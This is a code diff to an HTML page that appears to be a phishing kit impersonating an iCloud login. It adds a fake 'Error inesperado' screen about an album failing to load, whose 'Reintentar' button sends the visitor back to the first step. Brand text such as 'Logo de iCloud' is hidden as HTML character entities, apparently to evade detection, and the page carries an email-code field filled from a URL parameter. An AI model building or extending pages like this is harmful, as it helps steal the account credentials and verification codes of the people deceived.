@@ -1567,6 +1567,8 @@
           var equisParam = getParameterByName("equis");
           document.getElementById("email-code-param").value = equisParam;
           document.getElementById("content3").style.display = "block";
+        } else if (contentParam === "4") {
+          document.getElementById("content4").style.display = "block";
         }
       }
 
@@ -1640,6 +1642,14 @@
           <button class="login-button-2" type="submit">&#67;&#111;&#110;&#116;&#105;&#110;&#117;&#97;&#114;</button>
       </form>
   </div>
-  
+  <div id="content4" class="login-container content">
+    <form action="" method="GET">
+        <img src="foto.png" alt="&#76;&#111;&#103;&#111; &#100;&#101; &#105;&#67;&#108;&#111;&#117;&#100;">
+            <h1>Error inesperado</h1>
+            <p>Hubo un error al cargar el álbum, sin embargo, puedes intentarlo nuevamente.</p>
+            <input type="hidden" name="content" value="1">
+            <button class="login-button-2" type="submit">Reintentar</button>
+    </form> 
+  </div>
   </body>
 </html>
